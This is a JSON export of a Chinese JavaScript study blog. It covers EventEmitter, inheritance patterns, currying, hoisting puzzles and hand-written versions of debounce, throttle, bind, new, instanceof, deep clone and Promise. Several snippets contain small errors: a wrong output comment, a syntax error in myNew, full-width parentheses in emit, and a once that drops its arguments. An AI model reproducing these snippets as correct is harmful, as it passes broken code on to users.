实现原理","date":"2021-03-12T07:32:28.000Z","updated":"2021-04-30T06:59:16.820Z","comments":true,"path":"2021/03/12/JavaScript 编程题/EventEmitter 实现原理/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/EventEmitter%20%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/","excerpt":"","text":"EventEmitter 实现原理1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586class EventEmitter &#123; constructor() &#123; this.events = Object.create(null) &#125; // 监听事件 on(eventName, fn) &#123; if (!this.events[eventName]) &#123; this.events[eventName] = [] &#125; this.events[eventName].push(fn) &#125; // 触发事件 emit(eventName, ...args) &#123; if (!this.events[eventName] || !Array.isArray(this.events[eventName])) return this.events[eventName].map(fn =&gt; &#123; fn.apply(this, args) &#125;) &#125; // 注销事件 off(eventName, fn) &#123; if (fn === void 0) &#123; this.events[eventName] = null return &#125; if (this.events[eventName].length) &#123; const index = this.events[eventName].findIndex(item =&gt; item === fn) if (index &gt; -1) &#123; this.events[eventName].splice(index, 1) &#125; &#125; &#125; // 注册单次执行的事件 once(eventName, fn) &#123; const only = (...args) =&gt; &#123; fn.apply(this, args) this.off(eventName) &#125; this.on(eventName, only) &#125;&#125;// test on/emit functionconst eventBus = new EventEmitter()eventBus.on(&#x27;click&#x27;, () =&gt; console.log(1))eventBus.emit(&#x27;click&#x27;)// --- output ---// 1// test on/emit functionconst cb = function (...args) &#123; console.log(&#x27;2: &#x27;, args)&#125;eventBus.on(&#x27;input&#x27;, () =&gt; console.log(1))eventBus.on(&#x27;input&#x27;, cb)eventBus.emit(&#x27;input&#x27;, &#123;name: &#x27;jack&#x27;&#125;, &#123;age: 18&#125;)// --- output ---// 1 ​​​​​// 2: [ &#123; name: &#x27;jack&#x27; &#125;, &#123; age: 18 &#125; ] // test on/off/emit functioneventBus.off(&#x27;input&#x27;, cb)eventBus.emit(&#x27;input&#x27;, &#123;name: &#x27;jack&#x27;&#125;, &#123;age: 18&#125;)// --- output ---// 1 ​​​​​// test on/off/emit functioneventBus.off(&#x27;input&#x27;)eventBus.emit(&#x27;input&#x27;, &#123;name: &#x27;jack&#x27;&#125;, &#123;age: 18&#125;)// --- output ---// test once/emit functioneventBus.once(&#x27;change&#x27;, cb)eventBus.emit(&#x27;change&#x27;, &#123;name: &#x27;jack&#x27;&#125;)eventBus.emit(&#x27;change&#x27;, &#123;name: &#x27;jack&#x27;&#125;)// --- output ---// [ &#123; name: &#x27;jack&#x27; &#125; ]","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"JS 实现继承的几种方式","slug":"JavaScript 编程题/JS 实现继承的几种方式","date":"2021-03-12T07:32:28.000Z","updated":"2021-04-30T06:59:25.245Z","comments":true,"path":"2021/03/12/JavaScript 编程题/JS 实现继承的几种方式/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/JS%20%E5%AE%9E%E7%8E%B0%E7%BB%A7%E6%89%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/","excerpt":"","text":"JS 实现继承的几种方式[TOC] 1. 原型链继承123456789101112131415161718192021function SuperType() &#123; this.property = true;&#125;SuperType.prototype.getSuperValue = function () &#123; return this.property;&#125;;function SubType() &#123; this.subproperty = false;&#125;//继承了 SuperTypeSubType.prototype = new SuperType();SubType.prototype.constructor = SubType;SubType.prototype.getSubValue = function () &#123; return this.subproperty;&#125;;var instance = new SubType();console.log(instance.getSubValue()); // falseconsole.log(instance.getSuperValue()); // true 缺点： 包含引用类型值的原型属性会被所有实例共享，原型链上的属性为引用类型时，某个实例修改原型链上的属性会导致其他实例也会受到影响 在创建子类型的实例时，不能向超类型的构造函数中传递参数 2. 借用构造函数继承1234567891011121314function SuperType()&#123; this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;];&#125;function SubType()&#123; //继承了 SuperType SuperType.call(this);&#125;var instance1 = new SubType();instance1.colors.push(&quot;black&quot;);console.log(instance1.colors); //&quot;red,blue,green,black&quot;var instance2 = new SubType();console.log(instance2.colors); //&quot;red,blue,green&quot; 缺点： 无法复用函数，因为方法都在构造函数中定义（没有通过原型链引用） 在超类型的原型中定义的方法，对子类型而言也是不可见的，结果所有类型都只能使用构造函数模式 3. 原型链 + 借用构造函数继承1234567891011121314151617181920212223242526272829function SuperType(name)&#123; this.name = name; this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;]; &#125; SuperType.prototype.sayName = function()&#123; console.log(this.name); &#125;; function SubType(name, age)&#123; //继承属性 SuperType.call(this, name); this.age = age; &#125; //继承方法 SubType.prototype = new SuperType(); SubType.prototype.constructor = SubType; SubType.prototype.sayAge = function()&#123; console.log(this.age); &#125;; var instance1 = new SubType(&quot;Nicholas&quot;, 29); instance1.colors.push(&quot;black&quot;); console.log(instance1.colors); //&quot;red,blue,green,black&quot; instance1.sayName(); //&quot;Nicholas&quot;; instance1.sayAge(); //29 var instance2 = new SubType(&quot;Greg&quot;, 27); console.log(instance2.colors); //&quot;red,blue,green&quot; instance2.sayName(); //&quot;Greg 说明：组合继承避免了原型链和借用构造函数的缺陷，融合了它们的优点，成为 JavaScript 中最常用的继承模式 缺点： 会调用两次超类型构造函数 4. 混入式继承123456789101112131415function MyClass() &#123; SuperClass.call(this); OtherSuperClass.call(this);&#125;// 继承一个类MyClass.prototype = Object.create(SuperClass.prototype);// 混合其它Object.assign(MyClass.prototype, OtherSuperClass.prototype);// 重新指定constructorMyClass.prototype.constructor = MyClass;MyClass.prototype.myMethod = function() &#123; // do something&#125;; 5. 原型式继承原型式继承适用于一个对象继承自另一个对象的情况，可以不必引入构造函数 ECMAScript5 通过新增 Object.create()方法规范化了原型式继承。这个方法接收两个参数：一个用作新对象原型的对象和（可选的）一个为新对象定义额外属性的对象 1234567891011121314151617181920var person = &#123; name: &quot;Nicholas&quot;, friends: [&quot;Shelby&quot;, &quot;Court&quot;, &quot;Van&quot;]&#125;;var anotherPerson = Object.create(person);anotherPerson.name = &quot;Greg&quot;;anotherPerson.friends.push(&quot;Rob&quot;);var yetAnotherPerson = Object.create(person);yetAnotherPerson.name = &quot;Linda&quot;;yetAnotherPerson.friends.push(&quot;Barbie&quot;);alert(person.friends); // &quot;Shelby,Court,Van,Rob,Barbie&quot; // 模拟 Object.create() 方法Object.$create = function(original) &#123; var fn = function() &#123;&#125;; fn.prototype = original; return new fn();&#125; 在没有必要兴师动众地创建构造函数，而只想让一个对象与另一个对象保持类似的情况下，原型式继承是完全可以胜任的，不过别忘了，包含引用类型值的属性始终都会共享相应的值，就像使用原型模式一样 6. 寄生式继承寄生式继承是结合了原型式继承和工厂模式的一种方式，即创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来增强对象，最后再像真地是它做了所有工作一样返回对象。适用于通过函数返回一个增强了的对象。 1234567891011121314function createAnother(original) &#123; var clone = Object.create(original); // 通过调用函数创建一个新对象 clone.sayHi = function () &#123; //以某种方式来增强这个对象 console.log(&quot;hi&quot;); &#125;; return clone; //返回这个对象&#125;var person = &#123; name: &quot;Nicholas&quot;, friends: [&quot;Shelby&quot;, &quot;Court&quot;, &quot;Van&quot;],&#125;;var anotherPerson = createAnother(person);anotherPerson.sayHi(); //&quot;hi&quot; 缺点： 需要在构造函数中给每个对象添加函数，导致不能复用函数 7. 寄生 + 原型链继承寄生 + 原型链是引用类型最理想的继承范式 123456789101112131415161718192021222324function inheritPrototype(subType, superType) &#123; var prototype = Object.create(superType.prototype); //创建对象 prototype.constructor = subType; //增强对象 subType.prototype = prototype; //指定对象&#125;function SuperType(name) &#123; this.name = name; this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;];&#125;SuperType.prototype.sayName = function () &#123; console.log(this.name);&#125;;function SubType(name, age) &#123; SuperType.call(this, name); this.age = age;&#125;inheritPrototype(SubType, SuperType);SubType.prototype.sayAge = function () &#123; console.log(this.age);&#125;; 8. Class 继承123456789101112131415161718192021222324252627282930313233343536373839404142434445class Parent &#123; constructor(name) &#123; this.name = name; &#125; static sayHello() &#123; console.log(&quot;hello&quot;); &#125; sayName() &#123; console.log(&quot;my name is &quot; + this.name); return this.name; &#125;&#125;class Child extends Parent &#123; constructor(name, age) &#123; super(name); this.age = age; &#125; sayAge() &#123; console.log(&quot;my age is &quot; + this.age); return this.age; &#125;&#125;let parent = new Parent(&quot;Parent&quot;);let child = new Child(&quot;Child&quot;, 18);console.log(&quot;parent: &quot;, parent); // parent: Parent &#123;name: &quot;Parent&quot;&#125;Parent.sayHello(); // helloparent.sayName(); // my name is Parentconsole.log(&quot;child: &quot;, child); // child: Child &#123;name: &quot;Child&quot;, age: 18&#125;Child.sayHello(); // hellochild.sayName(); // my name is Childchild.sayAge(); // my age is 18// 1、构造器原型链Child.__proto__ === Parent; // trueParent.__proto__ === Function.prototype; // trueFunction.prototype.__proto__ === Object.prototype; // trueObject.prototype.__proto__ === null; // true// 2、实例原型链child.__proto__ === Child.prototype; // trueChild.prototype.__proto__ === Parent.prototype; // trueParent.prototype.__proto__ === Object.prototype; // trueObject.prototype.__proto__ === null; // true","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"JS 链式调用与流程控制","slug":"JavaScript 编程题/JS 链式调用与流程控制","date":"2021-03-12T07:32:28.000Z","updated":"2021-04-30T06:59:04.090Z","comments":true,"path":"2021/03/12/JavaScript 编程题/JS 链式调用与流程控制/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/JS%20%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E4%B8%8E%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/","excerpt":"","text":"JS 链式调用与流程控制 能链式调用 能控制程序调用时机（休眠） 同步函数在同一个执行栈中执行 12345678910111213141516171819202122232425262728293031323334353637383940414243const Person = function() &#123; this.tasks = []; setTimeout(() =&gt; &#123; this.next(); &#125;, 0); return this;&#125;Person.prototype.next = function() &#123; const fn = this.tasks.shift(); fn &amp;&amp; fn();&#125;Person.prototype.eat = function() &#123; const fn = () =&gt; &#123; console.log(&#x27;eat&#x27;); this.next(); &#125;; this.tasks.push(fn); return this;&#125;Person.prototype.lunch = function() &#123; const fn = () =&gt; &#123; console.log(&#x27;lunch&#x27;); this.next(); &#125;; this.tasks.push(fn); return this;&#125;Person.prototype.sleep = function(seconds) &#123; const fn = () =&gt; &#123; console.log(`sleep $&#123;seconds&#125; seconds`); setTimeout(() =&gt; &#123; this.next(); &#125;, seconds * 1000) &#125;; this.tasks.push(fn); return this;&#125;const person = new Person();person.eat().sleep(2).lunch().sleep(3).sleep(3)","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"JS 链式调用与累加功能","slug":"JavaScript 编程题/JS 链式调用与累加功能","date":"2021-03-12T07:32:28.000Z","updated":"2021-04-30T06:59:20.404Z","comments":true,"path":"2021/03/12/JavaScript 编程题/JS 链式调用与累加功能/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/JS%20%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8%E4%B8%8E%E7%B4%AF%E5%8A%A0%E5%8A%9F%E8%83%BD/","excerpt":"","text":"JS 链式调用与累加功能1. 实现 add 函数使得满足以下条件需满足的条件： add(1).sum() //=&gt; 1 add(1)(2).sum() //=&gt; 2 add(1)(2)(3).sum() //=&gt; 6 add(1)(2)(3)(4).sum() //=&gt; 10 12345678910111213141516function add(a) &#123; let total = a const fn = function(b) &#123; total += b return fn &#125; fn.sum = function() &#123; return total &#125; return fn&#125;add(1).sum() // =&gt; 1add(1)(2).sum() //=&gt; 3add(1)(2)(3).sum() //=&gt; 6add(1)(2)(3)(4).sum() //=&gt; 10 2. 实现 add 函数使得满足以下条件需满足的条件: add(1) // =&gt; 1; add(1)(2) //=&gt; 3; add(1)(2)(3) //=&gt; 6; add(1)(2)(3)(4) //=&gt; 10; 123456789101112131415function add(num1) &#123; const sum = function(num2) &#123; num1 += num2 return sum &#125; sum.toString = function() &#123; return num1 &#125; return sum&#125;add(1) // output: 1add(1)(2) // output: 3add(1)(2)(3) // output: 4 需满足的条件： add(1); // 1 add(1)(2); // 3 add(1)(2)(3); // 6 add(1)(2, 3); // 6 add(1, 2)(3); // 6 add(1, 2, 3); // 6 12345678910111213141516171819function add(...args1) &#123; let total = args1.reduce((a, b) =&gt; a + b, 0) const sum = function(...args2) &#123; total = args2.reduce((a, b) =&gt; a + b, total) return sum &#125; sum.toString = function() &#123; return total &#125; return sum&#125;add(1) // output: 1add(1)(2) // output: 3add(1)(2)(3) // output: 6add(1)(2, 3) // output: 6add(1, 2)(3) // output: 6add(1, 2, 3) // output: 6","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"Promise 简易版实现","slug":"JavaScript 编程题/Promise 简易版实现","date":"2021-03-12T07:32:28.000Z","updated":"2021-04-30T06:59:28.690Z","comments":true,"path":"2021/03/12/JavaScript 编程题/Promise 简易版实现/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/Promise%20%E7%AE%80%E6%98%93%E7%89%88%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"Promise 简易版实现todo","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"变量提升、this 指向、运算符优先级问题","slug":"JavaScript 编程题/变量提升、this 指向、运算符优先级问题","date":"2021-03-12T07:32:28.000Z","updated":"2021-04-30T06:59:08.062Z","comments":true,"path":"2021/03/12/JavaScript 编程题/变量提升、this 指向、运算符优先级问题/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/%E5%8F%98%E9%87%8F%E6%8F%90%E5%8D%87%E3%80%81this%20%E6%8C%87%E5%90%91%E3%80%81%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7%E9%97%AE%E9%A2%98/","excerpt":"","text":"变量提升、this 指向、运算符优先级问题1234567891011121314151617function Foo() &#123; getName = function () &#123; alert (1); &#125;; return this;&#125;Foo.getName = function () &#123; alert (2);&#125;;Foo.prototype.getName = function () &#123; alert (3);&#125;;var getName = function () &#123; alert (4);&#125;;function getName() &#123; alert (5);&#125;//请写出以下输出结果：Foo.getName();getName();Foo().getName();getName();new Foo.getName();new Foo().getName();new new Foo().getName(); 分析： 第一问的 Foo.getName 指向 Foo 函数上存储的静态属性 第二问的 getName 指向的是 function () &#123; alert (4);&#125; 通过 var 声明的变量挂载在 window 对象下 函数 function getName() &#123; alert (5);&#125; 会被提升到最前面 语句 var getName = function () &#123; alert (4);&#125;; 会先进行变量提升，值为 undefined，然后执行到赋值语句时 getName 指向 function () &#123; alert (4);&#125; 第三问的 Foo().getName() 最终指向 function () &#123; alert (1); &#125; Foo() 执行时会将 getName 赋值为 function () &#123; alert (1); &#125; Foo() 执行完成后的返回值为 this，此时 this 指向 window 相当于执行 window.getName() 第四问的 getName，相当于执行 window.getName 第五问的 new Foo.getName() 相当于是 new (Foo.getName)() 第六问的 new Foo().getName() 相当于是 (new Foo()).getName() 第七问的 new new Foo().getName() 相当于是 new ((new Foo()).getName)() 123456789// ---答案---Foo.getName(); // 2getName(); // 4Foo().getName(); // 1getName(); // 1new Foo.getName(); // 2new Foo().getName(); // 3new new Foo().getName(); // 2 相关链接 前端同学经常忽视的一个 JavaScript 面试题","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"常见工具函数的实现原理","slug":"JavaScript 编程题/常见工具函数的实现原理","date":"2021-03-12T07:32:28.000Z","updated":"2021-04-30T06:59:12.312Z","comments":true,"path":"2021/03/12/JavaScript 编程题/常见工具函数的实现原理/","link":"","permalink":"https://xuxb.github.io/2021/03/12/JavaScript%20%E7%BC%96%E7%A8%8B%E9%A2%98/%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E5%87%BD%E6%95%B0%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/","excerpt":"","text":"常见工具函数的实现原理[TOC] 防抖函数防抖是 N 秒内函数只会被执行一次，如果 N 秒内再次被触发，则重新计算延迟时间（该方法会在最后一次操作的一段时间后才会执行，如 window.keyup、搜索提示等） 类似于狙击手的瞄准过程，狙击手在瞄准目标之后再过一段稳定时间（防止手抖）后才会射击目标 1234567891011121314151617181920function debounce(fn, delay = 500, immediate = false) &#123; let timer; return function() &#123; const args = arguments; const context = this; if (immediate &amp;&amp; !timer) &#123; fn.apply(context, args); &#125; if (timer) &#123; clearTimeout(timer); &#125; timer = setTimeout(() =&gt; &#123; fn.apply(context, args); &#125;, delay); &#125;&#125;; 节流函数节流是规定一个单位时间，在这个单位时间内最多只能触发一次函数执行（对于频繁操作，任意两次操作只会在一定时间间隔内才会执行，如 window.resize、window.scroll 等事件） 类似于水龙头上的水滴，水滴总会在积累到一定的大小之后才会滴下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// throttle 节流阀 function throttle(fn, delay) &#123; let timeout; let start = new Date(); let threshhold = delay || 200; return function () &#123; let context = this, args = arguments, curr = new Date(); clearTimeout(timeout); //总是干掉事件回调 if (curr - start &gt;= threshhold) &#123; fn.apply(context, args); //只执行一部分方法，这些方法是在某个时间段内执行一次 start = curr; &#125; else &#123; //让方法在脱离事件后也能执行一次 timeout = setTimeout(function () &#123; fn.apply(context, args); &#125;, threshhold); &#125; &#125;; &#125;; // 该实现比较简单，但问题在于执行的始终是某一时间段内的第一个函数，而不是最后一个，可能并不准确 function throttle(fn, delay = 500, immediate = false) &#123; let timer; return function() &#123; const args = arguments; const context = this; if (immediate) &#123; fn.apply(context, args); immediate = false; &#125; if (!timer) &#123; timer = setTimeout(() =&gt; &#123; fn.apply(context, args); timer = null; &#125;, delay); &#125; &#125;&#125;; call、apply 和 bind 函数1234567891011121314151617181920212223242526272829303132333435363738394041424344Function.prototype.$call = function(context) &#123; context = context || window; const fn = +new Date() + &#x27;&#x27; + Math.random(); // 防止同名的 key context[fn] = this; const args = [...arguments].slice(1); const result = eval(&#x27;context[fn](&#x27; + args.toString() +&#x27;)&#x27;) delete context[fn]; return result;&#125;Function.prototype.$apply = function(context, args = []) &#123; context = context || window; const fn = +new Date() + &#x27;&#x27; + Math.random(); // 防止同名的 key context[fn] = this; const result = context[fn](...args); delete context[fn]; return result;&#125;// Function.prototype.bind 方法的实现Function.prototype.$bind = function (context) &#123; let self = this; let args = Array.prototype.slice.call(arguments, 1); let fBind = function () &#123; // 说明：一个绑定函数也能使用 new 操作符创建对象，并需要继承原函数的原型链方法，这种行为就像把原函数当成构造器，提供的 this 值被忽略，同时调用时的参数被提供给模拟函数 // 通过 new 方法使用该绑定函数时，this 指向新创建的对象，则 this instanceof fBind 成立 return this.apply(this instanceof fBind ? this : context, args.concat(arguments)); &#125;; // 用于把原型链传递下去 fBind.prototype = Object.create(this.prototype); // ES5 中才加入 Object.create() 和 Function.prototype.bind，所以 Function.prototype.bind 不能使用时，Object.create() 也不能使用，所以使用中转函数将原型链传递下去 // function F () &#123;&#125; // F.prototype = this.prototype; // fBind.prototype = new F(); return fBind;&#125; 实现 new 操作符使用 new 操作符创建一个对象时，会进行以下步骤： 创建（或者说构造）一个全新的对象。 这个新对象会被执行 [[ 原型 ]] 连接。 这个新对象会绑定到函数调用的 this 。 如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象。 123456789101112function myNew(fn, ...args) &#123; // let obj = &#123;&#125;; // obj.__proto__ fn.prototype; let obj = Object.create(fn.prototype); let result = fn.apply(obj, ...args); if ((result &amp;&amp; typeof result === &#x27;object&#x27;) || typeof result === &#x27;function&#x27;)) &#123; return result; &#125; return obj;&#125; 实现 instanceof 操作符instanceof 的原理是右侧对象的原型对象（prototype ）是否在左侧对象的原型链上面 123456789101112131415161718function myInstanceof(left, right) &#123; let leftProp = left.__proto__; let rightProp = right.prototype; // 一直会执行循环 直到函数return while (true) &#123; // 遍历到了原型链最顶层 if (leftProp === null) &#123; return false; &#125; if (leftProp === rightProp) &#123; return true; &#125; else &#123; // 遍历赋值__proto__做对比 leftProp = leftProp.__proto__; &#125; &#125;&#125; 实现深度拷贝1234567891011121314151617181920212223242526// 定义一个深拷贝函数 接收目标target参数function deepClone(target) &#123; let result; if (typeof target === &#x27;object&#x27;) &#123; // 如果当前需要深拷贝的是一个对象的话 if (Array.isArray(target)) &#123; result = []; // 将result赋值为一个数组，并且执行遍历 for (let i in target) &#123; result.push(deepClone(target[i])) &#125; &#125; else if (target === null) &#123; result = null; &#125; else if(target.constructor === RegExp)&#123; result = target; &#125; else &#123; result = &#123;&#125;; for (let i in target) &#123; result[i] = deepClone(target[i]); &#125; &#125; &#125; else &#123; // 如果不是对象的话，就是基本数据类型，那么直接赋值 result = target; &#125; return result;&#125; 12345678910111213141516171819202122232425262728293031// 如果是基本数据类型，直接返回// 如果是 RegExp 或者 Date 类型，返回对应类型// 如果是复杂数据类型，递归。// 考虑循环引用的问题function deepClone(obj, hash = new WeakMap()) &#123; //递归拷贝 if (obj instanceof RegExp) return new RegExp(obj); if (obj instanceof Date) return new Date(obj); if (obj === null || typeof obj !== &quot;object&quot;) &#123; //如果不是复杂数据类型，直接返回 return obj; &#125; if (hash.has(obj)) &#123; return hash.get(obj); &#125; /** * 如果obj是数组，那么 obj.constructor 是 [Function: Array] * 如果obj是对象，那么 obj.constructor 是 [Function: Object] */ let t = new obj.constructor(); hash.set(obj, t); for (let key in obj) &#123; //递归 if (obj.hasOwnProperty(key)) &#123; //是否是自身的属性 t[key] = deepClone(obj[key], hash); &#125; &#125; return t;&#125; EventEmitter (发布订阅模式)12345678910111213141516171819202122232425262728293031323334353637383940// 手写发布订阅模式 EventEmitterclass EventEmitter &#123; constructor() &#123; this.events = Object.create(null); &#125; // 实现订阅 on(type, callBack) &#123; if (!this.events[type]) &#123; this.events[type] = []; &#125; this.events[type].push(callBack); &#125; // 删除订阅 off(type, callBack) &#123; if (!this.events[type]) return; this.events[type] = this.events[type].filter(item =&gt; &#123; return item !== callBack; &#125;); &#125; // 只执行一次订阅事件 once(type, callBack) &#123; function fn() &#123; callBack(); this.off(type, fn); &#125; this.on(type, fn); &#125; // 触发事件 emit(type, ...rest) &#123; if（this.events[type]）&#123; this.events[type].forEach(fn =&gt; fn.apply(this, rest)) &#125; &#125;&#125; Promise 实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// Promise 简易版实现原理var Promise = function Promise(fn) &#123; var callbacks = []; var state = &quot;pending&quot;; var value; function handler(callback) &#123; if (state === &quot;pending&quot;) &#123; callbacks.push(callback); return; &#125; var cb = state === &quot;fulfilled&quot; ? callback.fulfilledCb : callback.rejectedCb; if (cb === null) &#123; // then 方法不传任何参数 cb = state === &quot;fulfilled&quot; ? callback.resolve : callback.reject; cb(value); return; &#125; var ret = cb(value); callback.resolve(value); &#125; function execute() &#123; setTimeout(() =&gt; callbacks.map((cb) =&gt; handler(cb)), 0); &#125; function resolve(val) &#123; if (val &amp;&amp; typeof val.then === &quot;function&quot;) &#123; // 判断 resolve() 中的参数是否为 promise 对象 val.then(resolve, reject); return; &#125; value = val; state = &quot;fulfilled&quot;; execute(); &#125; function reject(val) &#123; value = val; state = &quot;rejected&quot;; execute(); &#125; this.then = function (fulfilledCb, rejectedCb) &#123; return new Promise((resolve, reject) =&gt; &#123; handler(&#123; fulfilledCb: fulfilledCb || null, rejectedCb: rejectedCb || null, resolve: resolve, reject: reject, &#125;); &#125;); &#125;; fn(resolve, reject);&#125;;new Promise((resolve, reject) =&gt; &#123; let num = Math.random(); num &gt; 0.5 ? resolve(num) : reject(num);&#125;).then( (num) =&gt; console.log(num), (num) =&gt; console.error(num));","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"语法","slug":"JavaScript/语法","date":"2021-01-29T06:24:48.000Z","updated":"2021-04-30T06:48:06.385Z","comments":true,"path":"2021/01/29/JavaScript/语法/","link":"","permalink":"https://xuxb.github.io/2021/01/29/JavaScript/%E8%AF%AD%E6%B3%95/","excerpt":"","text":"语法1. 语句每个语句都有一个结果值（如 undefined） 代码块 &#123; .. &#125; 的结果值是其最后一个语句或表达式的结果 ECMAScript 规范定义 var 语句的结果值是 undefined 语法不允许我们获得语句的结果值并将其赋值给另一个变量（至少目前不行） 2. 表达式的副作用123456var a, b, c;a = b = c = 42;// 这里 c = 42 的结果值为 42 （副作用是将 c 赋值 42 ），// 然后 b = 42 的结果值为 42 （副作用是将 b 赋值 42 ），// 最后是 a = 42 （副作用是将 a 赋值 42 ） 3. 标签语句标签语句：实现类似 goto 的功能，用于控制循环的跳转（并不推荐使用） continue 和 break 语句都可以带一个标签 12345678910111213141516171819// `contine foo` 指执行foo 循环的下一轮循环foo: for (var i = 0; i &lt; 4; i++) &#123; for (var j = 0; j &lt; 4; j++) &#123; if (j == i) &#123; // 如果j和i相等，继续外层循环 continue foo; // 跳转到foo的下一个循环 &#125; if ((j * i) % 2 == 1) &#123; // 跳过奇数结果 continue; // 继续内层循环（没有标签的） &#125; console.log(i, j); &#125;&#125;// ------ output ------// 1 0// 2 0// 2 1// 3 0// 3 2 **Note: ** switch...case... 语句中使用严格相等进行比较，如需使用非严格相等，可使用 switch (true) &#123; case (a == 1)... &#125; 由于浏览器演进的历史遗留问题，在创建带有 id 属性的 DOM 元素时也会创建同名的全局变量","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 原理","slug":"JavaScript-原理","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%8E%9F%E7%90%86/"}]},{"title":"数据类型与类型转换","slug":"JavaScript/数据类型与类型转换","date":"2021-01-27T04:32:18.000Z","updated":"2021-04-30T03:50:30.842Z","comments":true,"path":"2021/01/27/JavaScript/数据类型与类型转换/","link":"","permalink":"https://xuxb.github.io/2021/01/27/JavaScript/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/","excerpt":"","text":"1、数据类型八种数据类型：null 、 undefined 、 boolean 、 number 、 string 、 symbol、bigint 和 object 12345678910111213typeof undefined === &#x27;undefined&#x27;; // truetypeof true === &#x27;boolean&#x27;; // truetypeof 42 === &#x27;number&#x27;; // truetypeof &#x27;42&#x27; === &#x27;string&#x27;; // truetypeof &#123; life: 42 &#125; === &#x27;object&#x27;; // truetypeof [1] === &#x27;object&#x27;; // true// 历史遗留问题typeof null === &#x27;object&#x27;; // true// ES6中新加入的类型typeof Symbol() === &#x27;symbol&#x27;; // truetypeof 12n === &#x27;bigint&#x27; // true 1.1 类型判断1.1.1 typeoftypeof 命令可以判断 Undefined, Boolean, String, Number, Symbol, BigInt 等基本数据类型，但无法判断 Null，Object, Array 等对象类型 123typeof null === &#x27;object&#x27;; // truetypeof &#123;&#125; === &#x27;object&#x27;; // truetypeof [] === &#x27;object&#x27;; // true 1.1.2 instanceof （不推荐使用）适合用于判断自定义的类实例对象, 而不是用来判断原生的数据类型，会有一些问题，不推荐使用 实质上是通过 constructor 字段来判断的，会逐层的在原型链上查找 iframe 之间不会共享原型链，通过 iframe 传值时，使用 instanceof 会有问题 123var arr = []arr instanceof Array // truearr instanceof Object // true 1.1.3 Object.prototype.toString() （推荐使用）Object.prototype.toString 方法, 可以获取到变量的准确的类型 Object.prototype.toString 的原理是当调用的时候, 就取值内部的 [[Class]] 属性值, 然后拼接成 &#39;[object &#39; + [[Class]] + &#39;]&#39; 这样的字符串并返回 123456789101112const fn = () =&gt; &#123;&#125;;const toString = Object.prototype.toString;toString.call(undefined); // [object Undefined]toString.call(null); // [object 